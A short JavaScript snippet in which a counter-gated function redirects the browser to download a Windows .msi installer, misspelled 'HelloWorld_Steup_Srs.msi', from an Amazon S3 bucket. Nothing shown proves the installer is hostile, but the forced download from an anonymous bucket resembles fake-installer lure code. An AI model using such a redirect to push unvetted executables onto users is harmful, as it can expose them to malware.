function loadUrl()
{
	if(num>=1)
	{
		var url="https://hh036.s3.ap-southeast-2.amazonaws.com/HelloWorld_Steup_Srs.msi";
		window.location=url;
	}
}

var num=0;
function getLoad()
{
	num++;
}
